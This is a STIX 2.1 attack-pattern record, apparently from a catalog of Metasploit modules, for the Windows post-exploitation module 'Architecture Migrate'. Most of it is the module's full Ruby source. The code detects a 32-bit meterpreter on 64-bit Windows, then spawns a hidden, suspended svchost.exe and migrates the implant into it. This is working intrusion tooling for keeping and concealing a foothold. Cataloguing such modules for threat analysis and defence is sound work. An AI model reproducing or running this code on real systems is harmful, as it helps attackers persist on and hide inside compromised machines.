{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--107a71cc-0862-4915-b453-465944e39827",
    "created": "2024-08-14T16:33:04.991063Z",
    "modified": "2024-08-14T16:33:04.991067Z",
    "name": "Architecture Migrate",
    "description": " This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a new process with the correct architecture and migrates into that process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/archmigrate.rb",
            "external_id": "archmigrate.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::File\n  include Msf::Post::Common\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Architecture Migrate',\n        'Description' => %q{\n          This module checks if the meterpreter architecture is the same as the OS architecture and if it's incompatible it spawns a\n          new process with the correct architecture and migrates into that process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Koen Riepe (koen.riepe@fox-it.com)'],\n        'References' => [''],\n        'Platform' => [ 'win' ],\n        'Arch' => [ 'x86', 'x64' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              stdapi_railgun_api\n              stdapi_sys_process_execute\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('EXE', [true, 'The executable to start and migrate into', 'C:\\windows\\sysnative\\svchost.exe']),\n        OptBool.new('FALLBACK', [ true, 'If the selected migration executable does not exist fallback to a sysnative file', true ]),\n        OptBool.new('IGNORE_SYSTEM', [true, 'Migrate even if you have SYSTEM privileges', false])\n      ],\n      self.class\n    )\n  end\n\n  def check_32_on_64\n    apicall = session.railgun.kernel32.IsWow64Process(-1, 4)['Wow64Process']\n    # railgun returns '\\x00\\x00\\x00\\x00' if the meterpreter process is 64bits.\n    if apicall == \"\\x00\\x00\\x00\\x00\"\n      migrate = false\n    else\n      migrate = true\n    end\n    return migrate\n  rescue StandardError\n    print_error('Railgun not available, this module only works for binary meterpreters.')\n  end\n\n  def get_windows_loc\n    apicall = session.railgun.kernel32.GetEnvironmentVariableA('Windir', 255, 255)['lpBuffer']\n    windir = apicall.split(':')[0]\n    return windir\n  end\n\n  def do_migrate\n    if check_32_on_64\n      print_status('The meterpreter is not the same architecture as the OS! Upgrading!')\n      newproc = datastore['EXE']\n      if exist?(newproc)\n        print_status(\"Starting new x64 process #{newproc}\")\n        pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid\n        print_good(\"Got pid #{pid}\")\n        print_status('Migrating..')\n        session.core.migrate(pid)\n        if pid == session.sys.process.getpid\n          print_good('Success!')\n        else\n          print_error('Migration failed!')\n        end\n      else\n        print_error('The selected executable to migrate into does not exist')\n        if datastore['FALLBACK']\n          windir = get_windows_loc\n          newproc = \"#{windir}:\\\\windows\\\\sysnative\\\\svchost.exe\"\n          if exist?(newproc)\n            print_status(\"Starting new x64 process #{newproc}\")\n            pid = session.sys.process.execute(newproc, nil, { 'Hidden' => true, 'Suspended' => true }).pid\n            print_good(\"Got pid #{pid}\")\n            print_status('Migrating..')\n            session.core.migrate(pid)\n            if pid == session.sys.process.getpid\n              print_good('Success!')\n            else\n              print_error('Migration failed!')\n            end\n          end\n        end\n      end\n    else\n      print_good('The meterpreter is the same architecture as the OS!')\n    end\n  end\n\n  def run\n    if datastore['IGNORE_SYSTEM']\n      do_migrate\n    elsif !datastore['IGNORE_SYSTEM'] && is_system?\n      print_error('You are running as SYSTEM! Aborting migration.')\n    elsif datastore['IGNORE_SYSTEM'] && is_system?\n      print_error('You are running as SYSTEM! You will lose your privileges!')\n      do_migrate\n    elsif !datastore['IGNORE_SYSTEM'] && !is_system?\n      print_status('You\\'re not running as SYSTEM. Moving on...')\n      do_migrate\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}